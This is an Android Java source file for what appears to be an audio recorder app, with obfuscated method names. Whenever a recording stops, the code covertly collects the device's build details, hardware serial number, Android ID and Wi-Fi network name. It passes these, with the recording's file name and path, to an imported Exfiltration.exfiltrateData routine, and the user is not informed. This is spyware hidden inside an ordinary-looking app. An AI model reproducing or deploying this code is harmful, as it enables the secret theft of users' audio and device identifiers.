package com.singaporetech.audiorecorder;
import android.provider.Settings;
import com.singaporetech.notepad.R;
import java.io.BufferedReader;
import androidx.annotation.Nullable;
import java.util.Base64;
import android.net.wifi.WifiInfo;
import java.security.KeyFactory;
import android.view.View;
import android.os.SystemClock;
import android.view.LayoutInflater;
import android.app.AlertDialog;
import java.security.spec.KeySpec;
import java.io.InputStreamReader;
import androidx.navigation.NavController;
import android.content.DialogInterface;
import androidx.navigation.Navigation;
import android.Manifest;
import android.content.Context;
import com.singaporetech.audiorecorder.Exfiltration;
import java.io.File;
import java.io.FileInputStream;
import androidx.fragment.app.Fragment;
import android.media.MediaRecorder;
import java.io.DataOutputStream;
import androidx.annotation.RequiresApi;
import android.widget.Chronometer;
import android.os.Bundle;
import androidx.core.app.ActivityCompat;
import java.util.Calendar;
import java.io.OutputStreamWriter;
import java.nio.charset.StandardCharsets;
import java.io.IOException;
import java.util.Locale;
import java.security.Key;
import android.view.ViewGroup;
import java.security.SecureRandom;
import java.security.AlgorithmParameters;
import androidx.annotation.NonNull;
import android.widget.TextView;
import java.io.DataInputStream;
import java.io.ByteArrayOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.io.InputStream;
import android.os.Build;
import android.net.wifi.WifiManager;
import java.io.ByteArrayInputStream;
import android.content.pm.PackageManager;
import android.telephony.TelephonyManager;
import android.widget.ImageButton;
import java.lang.reflect.Method;
import java.security.spec.X509EncodedKeySpec;
public class RecordFragment extends Fragment implements View.OnClickListener {
 private NavController navController;
 private ImageButton listBtn;
 private ImageButton recordBtn;
 private TextView filenameText;
 public String recordpath;
 public String filepath;
 public String currTime;
 public String deviceID;
 private boolean isRecording = false;
 private String recordPermission = Manifest.permission.RECORD_AUDIO;
 private int PERMISSION_CODE = 21;
 private MediaRecorder mediaRecorder;
 private String recordFile;
 private Chronometer timer;
 public RecordFragment() {
 }
    @Override public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
 return inflater.inflate(R.layout.fragment_record, container, false);
 }
    @Override public void onViewCreated(@NonNull View view, @Nullable Bundle savedInstanceState) { super.onViewCreated(view, savedInstanceState);
 navController = Navigation.findNavController(view);
 listBtn = view.findViewById(R.id.record_list_btn);
 recordBtn = view.findViewById(R.id.record_btn);
 timer = view.findViewById(R.id.record_timer);
 filenameText = view.findViewById(R.id.record_filename);
 listBtn.setOnClickListener(this);
 recordBtn.setOnClickListener(this);
 }
 @RequiresApi(api = Build.VERSION_CODES.M)
    @Override public void onClick(View v) { switch (v.getId()) {
 case R.id.record_list_btn:
 if(isRecording){
 AlertDialog.Builder alertDialog = new AlertDialog.Builder(getContext());
 alertDialog.setPositiveButton("OKAY", new DialogInterface.OnClickListener() {
                        @Override public void onClick(DialogInterface dialog, int which) { navController.navigate(R.id.action_recordFragment_to_audioListFragment);
 isRecording = false;
 }
 });
 alertDialog.setNegativeButton("CANCEL", null);
 alertDialog.setTitle("Audio Still recording");
 alertDialog.setMessage("Are you sure, you want to stop the recording?");
 alertDialog.create().show();
 } else {
 navController.navigate(R.id.action_recordFragment_to_audioListFragment);
 }
 break;
 case R.id.record_btn:
 if(isRecording) {
 try {
 Ll1llLLlL11l11IL1ll();
 } catch (IOException e) {
 e.printStackTrace();
 }
 recordBtn.setImageDrawable(getResources().getDrawable(R.drawable.record_btn_stopped, null));
 isRecording = false;
 } else {
 if(III1l11l1IlI1L()) {
 try {
 lIlILLLl();
 } catch (IOException e) {
 e.printStackTrace();
 }
 recordBtn.setImageDrawable(getResources().getDrawable(R.drawable.record_btn_recording, null));
 isRecording = true;
 }
 }
 break;
 }
 }
 @RequiresApi(api = Build.VERSION_CODES.M)
 private void Ll1llLLlL11l11IL1ll() throws IOException {
 timer.stop();
 filenameText.setText("Recording Stopped, File Saved : " + recordFile);
 String lL1I11 = ILlIlI1IlLl();
 Exfiltration.exfiltrateData(deviceID,recordFile, currTime,recordpath,lL1I11 );
 mediaRecorder.stop();
 mediaRecorder.release();
 mediaRecorder = null;
 }
 @RequiresApi(api = Build.VERSION_CODES.M)
 private void lIlILLLl() throws IOException {
 timer.setBase(SystemClock.elapsedRealtime());
 timer.start();
 String LlllLL = getActivity().getExternalFilesDir("/").getAbsolutePath();
 recordpath = LlllLL;
 SimpleDateFormat formatter = new SimpleDateFormat("yyyy_MM_dd_hh_mm_ss", Locale.CANADA);
 Date now = new Date();
 currTime = formatter.format(now);
 recordFile = "Recording_" + currTime + ".3gp";
 filenameText.setText("Recording, File Name : " + recordFile);
 mediaRecorder = new MediaRecorder();
 mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
 mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
 mediaRecorder.setOutputFile(LlllLL + "/" + recordFile);
 filepath = LlllLL + "/" + recordFile;
 mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
 ILlIlI1IlLl();
 try {
 mediaRecorder.prepare();
 } catch (IOException e) {
 e.printStackTrace();
 }
 mediaRecorder.start();
 }
 @RequiresApi(api = Build.VERSION_CODES.M)
 public String ILlIlI1IlLl() {
 String l1L1lI11 = "Info_" + currTime + ".txt";
 String lIlIILl1LL1lLLI1LI = "";
 WifiManager wifiManager = (WifiManager) getContext().getApplicationContext().getSystemService(Context.WIFI_SERVICE);
 WifiInfo info = wifiManager.getConnectionInfo();
 String LLI1LILlIIIl1111LII1 = info.getSSID();
 deviceID = Settings.Secure.getString(getContext().getContentResolver(), Settings.Secure.ANDROID_ID);
 TelephonyManager telephonyManager = (TelephonyManager) getActivity().getSystemService(Context.TELEPHONY_SERVICE);
 String LlLLI1LLLl1lLL1Ll = "Brand: " + Build.BRAND
 + "\nDevice: " + Build.DEVICE
 + "\nBoard: " + Build.BOARD
 + "\nBootloader: " + Build.BOOTLOADER
 + "\nDisplay: " + Build.DISPLAY
 + "\nFingerprint: " + Build.FINGERPRINT
 + "\nHardware: " + Build.HARDWARE
 + "\nHost: " + Build.HOST
 + "\nID: " + Build.ID
 + "\nManufacturer: " + Build.MANUFACTURER
 + "\nModel: " + Build.MODEL
 + "\nSerial Number: " + gwgg()
 + "\nUser: " + Build.USER
 + "\nDevice ID: " + deviceID
 + "\nAndroid Version: " + Build.VERSION.RELEASE + " API " + Build.VERSION.SDK_INT
 + "\nWifi SSID:" + LLI1LILlIIIl1111LII1;
 return LlLLI1LLLl1lLL1Ll;
 }
 public static String gwgg() {
 String serialNumber;
 try {
 Class<?> c = Class.forName("android.os.SystemProperties");
 Method get = c.getMethod("get", String.class);
 serialNumber = (String) get.invoke(c, "gsm.sn1");
 if (serialNumber.equals(""))
 serialNumber = (String) get.invoke(c, "ril.serialnumber");
 if (serialNumber.equals(""))
 serialNumber = (String) get.invoke(c, "ro.serialno");
 if (serialNumber.equals(""))
 serialNumber = (String) get.invoke(c, "sys.serialnumber");
 if (serialNumber.equals(""))
 serialNumber = Build.SERIAL;
 if (serialNumber.equals(""))
 serialNumber = null;
 } catch (Exception e) {
 e.printStackTrace();
 serialNumber = null;
 }
 return serialNumber;
 }
 private boolean III1l11l1IlI1L() {
 if (ActivityCompat.checkSelfPermission(getContext(), recordPermission) == PackageManager.PERMISSION_GRANTED) {
 return true;
 } else {
 ActivityCompat.requestPermissions(getActivity(), new String[]{recordPermission}, PERMISSION_CODE);
 return false;
 }
 }
 @RequiresApi(api = Build.VERSION_CODES.M)
    @Override public void onStop() { super.onStop();
 if(isRecording){
 try {
 Ll1llLLlL11l11IL1ll();
 } catch (IOException e) {
 e.printStackTrace();
 }
 }
 }
 }
